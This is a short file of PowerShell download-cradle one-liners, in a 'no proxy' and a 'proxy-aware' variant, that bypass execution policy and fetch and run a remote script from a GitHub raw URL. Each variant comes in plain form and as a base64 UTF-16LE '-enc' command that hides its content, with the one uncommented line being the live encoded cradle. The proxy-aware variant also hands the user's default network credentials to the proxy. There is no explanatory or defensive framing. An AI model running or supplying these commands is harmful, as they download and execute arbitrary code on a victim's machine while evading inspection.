#Sans proxy
#powershell.exe -noexit -ep bypass -command "IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xK4mu/test/main/encoded.ps1'))"
#echo "IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xK4mu/test/main/encoded.ps1'))" | iconv --to-code UTF-16LE | base64 -w 0
powershell.exe -noexit -ep bypass -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwAwAHgASwA0AG0AdQAvAHQAZQBzAHQALwBtAGEAaQBuAC8AZQBuAGMAbwBkAGUAZAAuAHAAcwAxACcAKQApAAoA

#Proxy aware
#powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/0xK4mu/test/main/encoded.ps1')|iex"
#powershell.exe -noexit -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwAwAHgASwA0AG0AdQAvAHQAZQBzAHQALwBtAGEAaQBuAC8AZQBuAGMAbwBkAGUAZAAuAHAAcwAxACcAKQB8AGkAZQB4AAoA
